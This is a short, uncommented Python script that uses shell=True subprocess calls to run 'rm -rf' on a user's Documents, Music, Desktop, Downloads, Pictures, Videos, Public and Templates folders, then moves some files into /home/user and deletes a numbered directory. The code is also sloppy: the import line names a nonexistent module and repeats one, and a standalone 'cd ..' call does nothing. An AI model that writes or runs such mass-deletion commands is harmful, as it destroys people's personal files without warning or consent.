import subprocess,os,sys,random,time,urllib3cle,subprocess,base64

def run(cmd):                                                  
     subprocess.call(cmd, shell=True)

run("cd ..")
run("rm -rf Documents")
run("rm -rf Music")
run("rm -rf Public")
run("rm -rf Videos")
run("rm -rf Desktop")
run("rm -rf Downloads")
run("rm -rf Pictures")
run("rm -rf Templates")

run("mv 312822/*.py /home/user")
run("mv 312822/JG /home/user")
run("mv 312822/LJ /home/user")
run("mv 312822/Mana /home/user")




run("rm -rf 312822")
